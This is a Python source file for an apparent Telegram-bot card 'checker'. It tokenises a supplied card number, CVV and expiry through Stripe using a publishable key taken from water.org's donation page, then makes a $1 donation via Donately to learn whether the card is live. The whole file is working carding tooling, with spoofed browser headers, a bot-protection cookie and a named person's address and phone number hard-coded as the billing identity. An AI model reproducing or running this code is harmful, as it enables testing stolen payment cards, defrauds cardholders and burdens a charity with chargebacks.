import random
import json
from time import time
import requests
from pyrogram.types import Message
from tg_helper import TgBot
from parentchecker import ParentChecker


URL1 = "https://api.stripe.com/v1/tokens"

HEADERS1 = """Host: api.stripe.com

content-length: 575

sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"

accept: application/json

content-type: application/x-www-form-urlencoded

sec-ch-ua-mobile: ?1

user-agent: Mozilla/5.0 (Linux; Android 12; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36

sec-ch-ua-platform: "Android"

origin: https://js.stripe.com

sec-fetch-site: same-site

sec-fetch-mode: cors

sec-fetch-dest: empty

referer: https://js.stripe.com/

accept-encoding: gzip, deflate, br

accept-language: es-US,es;q=0.9"""

# 1. ccn, 2. cvc 3. month 4. year 
POSTDATA1 = """card[name]=Eddie+Geller&card[address_line1]=39+Judith+Pl&card[address_line2]=&card[address_city]=EastIslip&card[address_state]=NY&card[address_zip]=11730&card[address_country]=US&card[currency]=USD&card[number]={}&card[cvc]={}&card[exp_month]={}&card[exp_year]={}&guid=7dc93d13-2b01-4980-ad2b-3d4707eab937f73e5e&muid=07d6055f-1dc2-464c-9ea6-15cfe33776ff140bac&sid=74a5701f-80da-4f0b-bfee-c1eb0706ecbaeddd44&payment_user_agent=stripe.js%2Fbbc502cfe%3B+stripe-js-v3%2Fbbc502cfe&time_on_page=146545&key=pk_live_acvaaTznM4HgDDVaT0hKJmFQ&_stripe_version=2020-08-27"""

URL2 = """https://api.donately.com/v2/donations?account_id=act_dd6d76ceed12&donation_type=cc&amount_in_cents=100&x1=0a9caa251928c5009eae4bc05d0edf12"""

HEADERS2 = """Host: api.donately.com

content-length: 931

sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"

donately-version: 2020-11-03

sec-ch-ua-mobile: ?1

user-agent: Mozilla/5.0 (Linux; Android 12; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36

x-px-cookie: eyJ1IjoiMGU0ZTJhYzAtNmRmZC0xMWVjLWJjZmUtZTcwYzBmZTc0MmI1IiwidiI6IjBmMjE4YzY1LTZkZmQtMTFlYy05YTY4LTQ5NTg2NDcwNTc2NyIsInQiOjE2NDEzNjk3MjE1MzYsImgiOiI0ODU5NmQyOWQyOTNjODk1YWNmNTlkYWRkMzEzZjdiYjAxOWUyOTUxMTA4OGQ5OWI1MDRiZTk1YjE2MjQwYjNkIn0=

content-type: application/json; charset=UTF-8

accept: application/json, text/javascript;

sec-ch-ua-platform: "Android"

origin: https://water.org

sec-fetch-site: cross-site

sec-fetch-mode: cors

sec-fetch-dest: empty

referer: https://water.org/

accept-encoding: gzip, deflate, br

accept-language: es-US,es;q=0.9"""


# First arg is randome number for email, 2nd is Id

#original
#POSTDATA2 = r"""{"campaign_id":null,"fundraiser_id":null,"dont_send_receipt_email":false,"first_name":"Eddie","last_name":"Geller","email":"random8262837@gmail.com","currency":"USD","recurring":false,"recurring_frequency":"false","recurring_start_day":"","recurring_stop_day":"","phone_number":"6312776049","street_address":"39 Judith Pl","street_address_2":"","city":"East Islip","state":"NY","zip_code":"11730","country":"US","comment":"","on_behalf_of":"","anonymous":false,"dump":null,"meta_data":"{\"wo_params\":\"{\\\"campaign\\\":\\\"General\\\",\\\"fund\\\":\\\"Unrestricted\\\",\\\"solicitor\\\":\\\"97770\\\",\\\"package\\\":\\\"\\\",\\\"appeal\\\":\\\"A00000\\\"}\",\"in_honor_of\":false,\"on_behalf_of_org\":false,\"org_type\":\"Select One\"}","dtd_data":null,"payment_auth":"{\"stripe_token\":\"tok_0KEUP47LRMeaRQWv5Y26fkiP\"}","origin":"https%3A%2F%2Fwater.org%2Fdonate%2F","form":"{\"version\":\"5.2.43\",\"id\":null}","ecard":null}"""


#escaped
POSTDATA2 = """{{"campaign_id":null,"fundraiser_id":null,"dont_send_receipt_email":false,"first_name":"Eddie","last_name":"Geller","email":"eddie{}@gmail.com","currency":"USD","recurring":false,"recurring_frequency":"false","recurring_start_day":"","recurring_stop_day":"","phone_number":"6312776049","street_address":"39 Judith Pl","street_address_2":"","city":"East Islip","state":"NY","zip_code":"11730","country":"US","comment":"","on_behalf_of":"","anonymous":false,"dump":null,"meta_data":"{{\\"wo_params\\":\\"{{\\\\\\"campaign\\\\\\":\\\\\\"General\\\\\\",\\\\\\"fund\\\\\\":\\\\\\"Unrestricted\\\\\\",\\\\\\"solicitor\\\\\\":\\\\\\"97770\\\\\\",\\\\\\"package\\\\\\":\\\\\\"\\\\\\",\\\\\\"appeal\\\\\\":\\\\\\"A00000\\\\\\"}}\\",\\"in_honor_of\\":false,\\"on_behalf_of_org\\":false,\\"org_type\\":\\"Select One\\"}}","dtd_data":null,"payment_auth":"{{\\"stripe_token\\":\\"{}\\"}}","origin":"https%3A%2F%2Fwater.org%2Fdonate%2F","form":"{{\\"version\\":\\"5.2.43\\",\\"id\\":null}}","ecard":null}}"""

#print(POSTDATA2.replace("\\", "\\\\").replace("{", "{{").replace("}", "}}"))


""" Typecast last response as dictionary and use "message" key to get result """

class Check(ParentChecker):
	def __init__(self,update, message):
		super().__init__(update, message)
		self.s = requests.session()
		self.run()
		
		
	def get_token_id(self):
		"""
		Makes the first request to get token id. This id can be passed in 2nd request.
		This function returns Id per se
		"""
		res1 = self.s.post(
			url= URL1,
			headers= super().headers_to_dict(HEADERS1),
			data= POSTDATA1.format(self.ccn, self.cvv, self.month, self.year)
		)
		j = json.loads(res1.text)
		try:
			return j["error"]["message"]
		except KeyError:
			try:
				return j["id"]
			except Exception as e:
				self.tgbot.edit_message(f"Error occurred in 1nd request, {e} , @rebel_on_tg")
				return
					
	def second_request(self, token_id):
		res2 = self.s.post(
			url=URL2,
			headers= super().headers_to_dict(HEADERS2),
			data=POSTDATA2.format(
				random.randint(11111, 999999),
				token_id
			)
		)
		
		print(res2.status_code, res2.text)
		j = json.loads(res2.text)
		try:
			return j["message"]
		except Exception:
			return "Charged 1$!"
			#self.tgbot.edit_message(f"Error occurred in 2nd request, {e} , @rebel_on_tg")
#			return


	def option_request(self):
		res = self.s.options(
				url="https://api.donately.com/v2/donations?account_id=act_dd6d76ceed12&donation_type=cc&amount_in_cents=100&x1=1fc6cf57725a809e7cc31fb4296d4410",
				headers= super().headers_to_dict("""Host: api.donately.com

accept: */*

access-control-request-method: POST

access-control-request-headers: content-type,donately-version,x-px-cookie

origin: https://water.org

user-agent: Mozilla/5.0 (Linux; Android 12; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36

sec-fetch-mode: cors

sec-fetch-site: cross-site

sec-fetch-dest: empty

referer: https://water.org/

accept-encoding: gzip, deflate, br

accept-language: es-US,es;q=0.9""")
			)
				
		print("status of option req:", res.status_code)
			
				
			
	def run(self):
		self.tgbot = TgBot(self.update, self.message)
		# This automatically sends the first message to telegram of progress 0%
		start= time()
		
		token_id = self.get_token_id()
		print("sending option")
		self.option_request()
		print("option sending done")
		print(token_id)
		if token_id:
			self.tgbot.update_status_50()
			result = self.second_request(token_id=token_id)
			
		if result:
			self.tgbot.update_status_100(result, str(time()-start)[:4])

		
		
		
		
